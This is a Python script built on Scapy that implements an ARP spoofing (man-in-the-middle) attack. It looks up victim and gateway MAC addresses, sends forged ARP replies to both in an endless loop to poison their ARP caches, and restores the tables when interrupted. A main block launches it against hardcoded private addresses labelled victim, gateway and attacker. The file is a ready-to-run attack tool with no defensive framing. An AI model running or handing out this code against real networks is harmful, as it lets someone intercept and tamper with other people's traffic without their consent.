from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp
import time


class ExceptionMacAddress(Exception):
    def __init__(self, message):
        super().__init__(message)  # Initialize the base class (Exception) with the message
        # self.context = context  # Store the context data

    def __str__(self):
        return f"{self.args[0]}"


class ARPSpoofer:
    def __init__(self,victim_ip:str,router_ip:str,attacker_mac:str,victim_mac=None,router_mac=None,clockRate=None) -> None:
        '''
            For a successfull ARP spoofing we need the victim ip @ and it's default gtw

            -The local network will be fluded with spoofed ARP request wihch will lead 
             to changing the arp table of the victim and the router (concerned lines 
             only) 

            Args :
                -ClockRate : 
                    the interval in seconds between arp spoofed packet creation
                    if set to False => no clock rate applied will result in an Agressive spoof.

        '''
        self.victim_ip = victim_ip
        self.router_ip = router_ip
        self.attacker_mac = attacker_mac

        self.victim_mac = victim_mac
        self.router_mac = router_mac
        self.clockRate = clockRate
    
       

    def getContextMac(self,victime=True)->str:
        """Get the MAC address of the victim/router."""
        if victime :
            mac = self.getIpMac(self.victim_ip)
            if not mac :
                raise Exception("Could not get VICTIM MAC addresses. Ensure the device is reachable.")
            self.victim_mac = mac
        mac = self.getIpMac(self.router_ip)
        if not mac :
                raise Exception("Could not get GTW MAC addresses. Ensure the device is reachable.")
        self.router_mac = mac
          
    
    def getIpMac(self,ip:str)->str:
        """Get the MAC address of the IP."""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, verbose=True)[0]
        
        return answered_list[0][1].hwsrc if answered_list else None
    
    def spit(self):
        """Send ARP spoofing packets to the victim and the router."""
        arp_response_victim = ARP(op=2, psrc=self.router_ip, pdst=self.victim_ip, hwdst= self.router_mac, hwsrc=self.attacker_mac)
        arp_response_router = ARP(op=2, psrc=self.victim_ip, pdst=self.router_ip, hwdst=self.victim_mac, hwsrc=self.attacker_mac)
        
        send(arp_response_victim, verbose=False)
        send(arp_response_router, verbose=False)

    def clean(self):
        """Restore the ARP tables."""
        arp_response_victim = ARP(op=2, psrc=self.router_ip, pdst=self.victim_ip, hwsrc=self.router_mac)
        arp_response_router = ARP(op=2, psrc=self.victim_ip, pdst=self.router_ip, hwsrc=self.victim_mac)
        
        send(arp_response_victim, count=5, verbose=False)
        send(arp_response_router, count=5, verbose=False)

    def prepareSpoof(self):
        # Get the router's MAC address
        print("VICTIM MAC",self.victim_mac)
        if not self.victim_mac :
            self.getContextMac(victime=True)
        else :
            print("VICTIM MAC",self.victim_mac)
            
        # Get the victim's MAC address
        if not self.router_mac :
            self.getContextMac(victime=False)
        else :
            print("ROUTER MAC",self.router_mac)

        if self.victim_mac is None :
            # exit(1)
            raise ExceptionMacAddress("Could not get victim MAC addresse. Ensure the device is reachable.")
        if  self.router_mac is None :
            # exit(1)
            raise ExceptionMacAddress("Could not get gtw MAC addresse. Ensure the devices are reachable.")
        
        self.fillVictimeARPTable()

        print("Starting ARP spoofing...")
    
    def fillVictimeARPTable(self):
        for i in range(0,10):
            arp_victime = ARP(op=2, pdst=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.router_ip, hwsrc=self.router_mac)
            send(arp_victime, verbose=False)
        

    def spoof(self):
        try:
            self.prepareSpoof()
            # return ;

            
            while True:
                self.spit()
                if self.clockRate:
                    time.sleep(self.clockRate) 
            

        except KeyboardInterrupt:
            print("\nStopping ARP spoofing...")
            self.clean()

if __name__ == "__main__":
    victim = {
        'ip' : '192.168.1.74',
        'mac' : "8:0:27:b4:97:59"
    }
    gtw = {
        'ip' : '192.168.1.254',
        'mac' : "80:ca:4b:ac:f3:3"
    }
    attacker = {
        'ip' : '192.168.1.73',
        'mac' : "ac:bc:32:91:0a:ad"
    }

    a = ARPSpoofer(
        victim_ip='192.168.1.74',
        router_ip="192.168.1.254",
        attacker_mac="ac:bc:32:91:0a:ad",
        clockRate=False,
        router_mac=gtw.get("mac"),
        victim_mac=victim.get('mac')
    )
    
    a.spoof() 
    # mac = a.getIpMac('192.168.1.254')
    # print("gtw mac",mac)
        